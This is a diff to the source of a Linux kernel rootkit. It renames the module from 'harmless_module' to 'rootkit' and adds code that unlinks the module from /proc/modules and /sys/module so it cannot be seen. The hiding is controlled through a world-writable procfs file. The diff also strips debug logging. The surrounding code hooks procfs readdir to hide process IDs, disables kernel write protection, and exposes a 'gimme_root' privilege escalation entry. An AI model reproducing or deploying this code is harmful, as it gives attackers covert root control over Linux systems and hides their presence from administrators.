@@ -14,7 +14,7 @@
 #define HIDE_FILE_FILE "hide_file"
 #define GIVE_ROOT_FILE "gimme_root"
 
-#define MODULE_NAME "harmless_module"
+#define MODULE_NAME "rootkit"
 
 
 #define CR0_PAGE_WP 0x10000
@@ -31,6 +31,25 @@ struct file_entry{
 	struct list_head list;	
 
 };
+
+static int module_hidden;
+static char* hide = "hide";
+static char* show = "show";
+static struct proc_dir_entry *proc_control=NULL;
+
+static struct file_operations *procfs_fops=NULL;
+
+
+static int (*procfs_readdir_proc)(struct file*, void*, filldir_t);
+
+static filldir_t kernel_filldir=NULL;
+
+static char internal_buffer[INTERNAL_BUFFER_LEN];
+static char pid[INTERNAL_BUFFER_LEN], command[INTERNAL_BUFFER_LEN];
+
+static struct list_head *module_prev=NULL, *module_kobj_prev ;
+static struct kobject* module_kobj_parent=NULL;
+
 
 static  struct file_entry* create_file_entry(char *name,struct list_head* head){
 
@@ -84,21 +103,6 @@ static inline void enable_wp(void){
 	write_cr0(read_cr0() | CR0_PAGE_WP);
 
 }
-
-static char* hide = "hide";
-static char* show = "show";
-static struct proc_dir_entry *proc_control;
-
-static struct file_operations *procfs_fops;
-
-
-static int (*procfs_readdir_proc)(struct file*, void*, filldir_t);
-
-static filldir_t kernel_filldir;
-
-char internal_buffer[INTERNAL_BUFFER_LEN];
-char pid[INTERNAL_BUFFER_LEN], command[INTERNAL_BUFFER_LEN];
-
 
 static int proc_filldir_hider(void* buf, const char *name, int namelen, loff_t offset, u64 ino , unsigned d_type){
 	
@@ -190,6 +194,62 @@ static int give_root_write(struct file* file, const char __user * buf, unsigned 
 	return count;
 }
 
+static int module_hide_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
+	
+		
+	return count;
+}
+
+static void hide_module(void){
+
+	if(module_hidden)
+		return;
+
+	
+	//hide from /proc/modules
+	module_prev = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+
+	//hide from /sys/module
+	module_kobj_parent = THIS_MODULE -> mkobj.kobj.parent;
+
+	module_kobj_prev = THIS_MODULE -> mkobj.kobj.entry.prev;
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+	
+	module_hidden=1;
+}
+
+static void show_module(void){
+
+	if(!module_hidden)
+		return;
+
+	//add to /proc/modules
+	list_add(&THIS_MODULE->list,module_prev);
+
+	//add to /sys/module
+//	kobject_add(&THIS_MODULE->mkobj.kobj,THIS_MODULE->mkobj.kobj.parent,MODULE_NAME);
+//	list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_prev);
+	module_hidden=0;
+
+}
+
+
+static int module_hide_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
+	if (count < 1){
+		return count;
+	}	
+
+	if(buf[0] == '1'){
+		hide_module();
+	}
+	if(buf[0] == '0'){
+		show_module();
+	}
+	return count;
+}
+
 static struct proc_dir_entry* create_procfs_entry(const char* name, umode_t mode, struct proc_dir_entry* parent
 		,int (*write_proc)(struct file*, const char __user *buf , unsigned long count, void *data)
 		,int (*read_proc)(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data) ){
@@ -224,14 +284,18 @@ static int control_init(void){
 	if( proc_control == NULL ){
 		return 0;	
 	}
+
 	create_procfs_entry(HIDE_PID_FILE,0666,proc_control,pid_hide_write,pid_hide_read);
 	create_procfs_entry(GIVE_ROOT_FILE, 0666,proc_control,give_root_write,NULL);
+	create_procfs_entry(HIDE_MODULE_FILE, 0666, proc_control, module_hide_write, module_hide_read);
 
 	return 1; 
 }
 
 static void control_cleanup(void){
 
+	remove_proc_entry(GIVE_ROOT_FILE,proc_control);
+	remove_proc_entry(HIDE_MODULE_FILE,proc_control);
 	remove_proc_entry(HIDE_PID_FILE, proc_control);
 	remove_proc_entry(CONTROL_DIR,NULL);
 
@@ -250,13 +314,11 @@ static int proc_init(void){
 
 	procfs_readdir_proc = procfs_fops -> readdir;
 	
-	printk(KERN_INFO"readdir");
 
 	disable_wp();
 	procfs_fops -> readdir = process_hider;
 	enable_wp();
 	
-	printk(KERN_INFO"out of proc init");
 	return 0; 
 	
 }
@@ -267,13 +329,12 @@ static void proc_cleanup(void){
 	if(procfs_fops !=NULL){
 		disable_wp();
 		procfs_fops -> readdir = procfs_readdir_proc ;
-		enable_wp();printk(KERN_INFO"%p", procfs_fops);
+		enable_wp();
 	}
 
 }
 
 static int __init m_init(void){
-	printk(KERN_INFO "rkit module loaded");
 	control_init();
 	proc_init();
 	return 0; 
@@ -281,7 +342,6 @@ static int __init m_init(void){
 }
 
 static void __exit m_exit(void){
-	printk(KERN_INFO "unloading");
 	proc_cleanup();
 	control_cleanup();
 	return;
